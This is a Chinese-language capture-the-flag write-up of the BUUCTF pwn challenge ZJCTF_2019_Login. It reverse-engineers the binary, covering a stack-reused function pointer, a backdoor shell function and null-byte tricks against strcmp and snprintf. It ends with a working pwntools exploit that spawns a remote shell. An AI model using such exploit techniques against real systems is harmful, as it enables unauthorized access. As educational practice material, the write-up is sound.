---
title: "BUUCTF Pwn ZJCTF_2019_Login"
date: 2020-05-02T22:52:15+08:00
author: NiceSeven
categories:
  - BUUCTF
tags:
  - Pwn
---

# BUUCTF Pwn ZJCTF_2019_Login

考点：

1、ret2libc1

2、64位函数传参顺序

3、简单汇编逆向

4、fgets函数和snprintf函数

![image-20200502225606271](/images/image-20200502225606271.png)

开启了cannary意味着栈溢出覆盖到retn需要leak出canary

![image-20200502225953931](/images/image-20200502225953931.png)

需要输入正确的username和password，但是ida中可以直接看到

![image-20200502230144649](/images/image-20200502230144649.png)

输入正确的username和password后程序直接蹦了

![image-20200502230228045](/images/image-20200502230228045.png)

可以确认只验证password不验证username

![image-20200503004552535](/images/image-20200503004552535.png)

拖入ida分析

![image-20200502230401405](/images/image-20200502230401405.png)

存在/bin/sh，交叉引用跟过去查看

![image-20200502230515960](/images/image-20200502230515960.png)

![image-20200502230555051](/images/image-20200502230555051.png)

可以发现Admin::shell()存在后门

![image-20200502231152489](/images/image-20200502231152489.png)

![image-20200502231051738](/images/image-20200502231051738.png)

在第二个password_checker函数执行的时候，传入的第一个参数，在函数内执行的时候用形参a1执行了

(**a1)(&s)，将指向指针的指针a1作为函数执行了，查看汇编代码

![image-20200502231614231](/images/image-20200502231614231.png)

也就是call rax，所以本题的思路是控制rax寄存器也就是控制a1为后门地址，在call rax的时候就可以getshell

进行逆向分析，回到main函数可以发现

![image-20200502232419469](/images/image-20200502232419469.png)

根据64位传参顺序第一个参数给rdi，可以知道这里传入给a1的值来自main函数中的rax

![image-20200502232820573](/images/image-20200502232820573.png)

这里rax来自main的栈rbp+var_130，最终来自于0x400b93的rax，那么这个rax又来自于哪里呢？

进入0x400b8e处的call password_checker查看

![image-20200502233330379](/images/image-20200502233330379.png)

可以发现rax来自于rbp+var_18，所以只要控制住了这个rbp+var_18为后门地址就可以控制a1为后门地址，从而控制前面所说的(**a1)来执行后门函数

回到前面，这个程序有俩个读入的操作，password是通过调用0x400b9f的read_password函数来读入的

![image-20200503002639925](/images/image-20200503002639925.png)

在read_password函数中是利用fgets函数来读

因为password_checker函数和read_password函数都在在main函数中执行，所以在执行到0x400b9f的read_password函数的时候读入的数据储存的栈空间与0x400b8e的password_check执行时储存数据的栈是同一块，也就是说fgets读入数据的地址s与rbp+var_18是同一块栈空间

![image-20200503003123602](/images/image-20200503003123602.png)

所以在读入password的时候可以填充0x60-0x18-14=58可以覆盖到var_18为后门的地址

回到第二个password_checker函数

![image-20200503003609905](/images/image-20200503003609905.png)

可以发现需要绕过if(!strcmp(a2,a3))，回顾分析

![image-20200503004751620](/images/image-20200503004751620.png)

可以知道v4是程序储存的密码，v5是我们输入的密码（本程序只验证password不验证username），也就是说在第二个password_checker函数中的a2是我们输入的密码，a3是程序储存的密码，所以可以使用\x00截断字符来绕过strcmp函数

接下来的一个坑点就是在snprintf这个函数中，从函数参数可以看到第一个&s地址与最后一个&s地址是和前面的rbp+var_18和s是同一块栈，所以在执行snprintf函数实际上是在重复覆盖，将原本储存的字符用%s格式化之后取最多0x50字节又储存到同一个地方，所以有可能就会将我们前面覆盖的rbp+var_18给覆盖，导致rax改变，从而无法getshell，解决办法就是使用\x00来截断，所以一共需要\x00截断两次，一次的截断输入的密码，一次是截断snprintf的输入

```python
#!/usr/bin/env python2
#-*- coding=UTF-8 -*-
from pwn import*
import sys
#from LibcSearcher import *

context.log_level = 'debug'
#context.terminal = ['terminator','-x','sh','-c']
binary = './zjctf2019_login' 
local = 0
if local == 1:
    sh = process(binary)
else:
    sh = remote("node3.buuoj.cn",28392)
elf=ELF(binary)
#libc=elf.libc
#libc = ELF('./.so')

shell = 0x400e88
sh.sendlineafter('username: ','admin')
password = '2jctf_pa5sw0rd'
offset = 0x60-0x18-len(password)
#payload = password + '\x00' + 'a'*36 +'\x00' + 'a'*20 + p64(shell)
payload = password + '\x00'*58 + p64(shell)
sh.sendlineafter('password: ',payload)
sh.interactive()
```

![image-20200503023715288](/images/image-20200503023715288.png)